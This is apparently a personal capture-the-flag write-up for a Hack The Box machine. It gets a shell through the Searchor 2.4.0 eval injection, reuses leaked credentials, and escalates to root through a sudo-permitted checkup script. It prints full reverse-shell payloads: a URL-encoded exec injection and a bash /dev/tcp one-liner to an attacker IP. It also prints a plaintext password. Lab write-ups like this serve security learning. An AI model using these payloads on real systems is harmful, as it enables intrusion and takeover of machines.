
As for all the machines on HTB, I am given the IP address `10.10.11.208` for this machine and I have to get the user and system flags

Frist, I start with a `nmap` scan for port enumeration
```shell
nmap -A -T4 10.10.11.208
```
The scan gave me 2 open ports:
- port 22 - for SSH
- port 80 - for a web server
![[Pasted image 20251022181307.png]]

Next step is to check the web application
- Checking the web application, I find a site what can search anything on the Internet from a collection of search engines
![[Pasted image 20251026163627.png]]
- Down the page I have the options to specify:
	- the search engine
	- the things I want to search 
![[Pasted image 20251026163734.png]]

- In the page footer I also found that the site is powered by `Flask` and `Searchor 2.4.0` 
![[Pasted image 20251026163831.png]]
- Now that version smells like a vulnerability so I have to check the Internet for any vulnerability related to this `Searchor 2.4.0`

Surprise surprise, searching on Google showed the fact that there is a vulnerability for `Searchor` for versions before `2.4.2` (which fits our case), which can lead to code execution. The vulnerability is the [CVE-2023-43364](https://nvd.nist.gov/vuln/detail/cve-2023-43364)

More information about how to exploit this vulnerability, I found in this git repository https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-
- To test the effectiveness of the exploit I will use `burp suite Repeater` to send custom inputs through the `query` parameter in search requests
![[Pasted image 20251026171148.png]]
- The exploit is simple and it explains that when I search I can input a malicious python script through the query input because:
	1. there is no input sanitization
	2. the backend code is evaluated with the `eval()` function
- The input that I have to send must look like this for proper working:
	- `"',exec("<python_script>"))#`
- Another thing is that it must be URL encoded to make the request valid so after encoding some special characters it will look like this:
	- `"',exec("<python_script_URL_encoded>"))%23`

- Now I will create a simple python script that will give me a remote shell on the machine:
	- First I use my terminal to encode a bash script to open a TCP connection
```shell
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'"|base64
```
```
Output: L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvNDQ0NCAwPiYxJwo=
```
- Now having this encoded bash script I will use the following URL encoded python script to input through the `query` parameter:
```
"',exec("__import__('os').system('echo+L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvNDQ0NCAwPiYxJwo%3d|base64+-d|bash+-i')%3b"))%23
```
![[Pasted image 20251026172343.png]]
- Lastly I open a listener with `nc -lvnp 4444` and wait for the connection
![[Pasted image 20251026172355.png]]

- The script worked as it gave me access as the user `svc`
- After this I went to the user home folder where I successfully found the user flag in the `user.txt` file
![[Pasted image 20251026172628.png]]

## Root Flag

After finding the user flag, now is the time to escalate our privileges to `root` and gain access to the system flag

- Through the first things I did when searching for something useful was to go back to the `/var/www/app` directory where the searcher website files were stored
- In this folder I also found a `.git` directory which means that there is a git repository present here
![[Pasted image 20251026181353.png]]
- The directory holds a lot of files but there is one named `config` which must be the most interesting
![[Pasted image 20251026181523.png]]
- The file contains a URL which leads to a subdomain of the `searcher.htb` website that being `gitea.searcher.htb` and also a pair of credentials to login
	- username: `cody`
	- password: `jh1usoih2bkjaspwe92`
- After following the link I found the `gitea` repository with the searcher application
![[Pasted image 20251026182118.png]]
- As we can see from the website the repository is private and its owner is the `administrator` user which I believe is our next target

At the bottom of the page, the version is listed `gitea v1.18.0`
![[Pasted image 20251026183138.png]]
- I tried to search for some exploits online but nothing worked so I moved on

- Because there was nothing on the site that can help me I returned to the linux server 
- Looking again at the config file I wondered if I could get a SSH connection by using the user `svc` and the password from the `gitea` account

- The connection was successful and now I got much more accessibility to the system 
![[Pasted image 20251026184131.png]]
- Having this connection I can check the output of the `sudo -l` command
![[Pasted image 20251026184632.png]]
- The output shows that I can run a python script and an option with it
- To see what options I can run with this script I simply added the help option `-h`
![[Pasted image 20251026185224.png]]
- The output shows that I have 3 options and everyone one of them with a description
- The option `docker-ps` shows 2 docker containers
![[Pasted image 20251026190242.png]]
- The option `docker-inspect` comes with 2 other required options
![[Pasted image 20251026190650.png]]
- And the option `full-checkup` shows nothing
![[Pasted image 20251026190724.png]]

- Turning back to the `docker-inspect` option I searched online for `<format>` option and found the information I needed at this link https://docs.docker.com/reference/cli/docker/inspect/
![[Pasted image 20251026191222.png]]
- The option I need is `-f` with `'{{json .}}'`

- So now I decided to check the following command for the first container named `gitea`:
```shell
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```
- Through the output I observed a password field which I hope is for the `administrator` account
![[Pasted image 20251026192241.png]]

- I tried to login with the password I found on the admin account and it was a success
![[Pasted image 20251026192906.png]]
- On the dashboard I can see that the user admin has a repository named `scripts`
- Checking the repository I observed that it contains the `system-checkup.py` script
![[Pasted image 20251026193032.png]]
- Checking the `system-checkup.py` script I found how the different options work
- The most useful is the `full-checkup` option because when it is used it searches for a script named `./full-checkup.sh` inside the directory it was run
![[Pasted image 20251026193240.png]]

- Since I can use this command with higher privileges, I can create my own `full-checkup.sh` script which will give me system rights and then I can run it to execute the script :
	- I simply use the following line of bash script to create the script file which will give me a shell as the `root` user when used with `sudo`
	```shell
	echo -en "#! /bin/bash\n/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'" > full-checkup.sh
	```
	- I give execute permission to the script `chmod +x full-checkup.sh`
	- I open a listener on my machine with `nc -lvnp 4444`
	- Then I run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

![[Pasted image 20251026195727.png]]

The script was successful and now that I got a reverse shell as the `root` user I can finally get the system flag
![[Pasted image 20251026195740.png]]
